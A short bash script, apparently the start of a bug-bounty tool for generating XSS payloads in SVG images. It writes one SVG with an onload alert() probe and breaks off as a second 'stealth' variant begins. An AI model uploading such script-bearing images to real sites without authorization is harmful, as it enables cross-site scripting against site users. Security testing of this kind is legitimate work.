#!/bin/bash
# ============= COMPLETE IMAGE XSS PAYLOAD GENERATOR 2026 =============

echo "🔥 Generating 20+ XSS Image Payloads for Bug Bounty..."

# ============= LEVEL 1: BASIC DETECTION =============

# 1. Basic Alert (Test if vulnerable)
cat > 1-alert.svg << 'EOF'
<svg onload="alert('XSS Found!')">
    <rect width="100" height="100" fill="red"/>
</svg>
EOF

# 2. Console Log (Stealth detection)
cat > 2-console.svg << 'EOF'
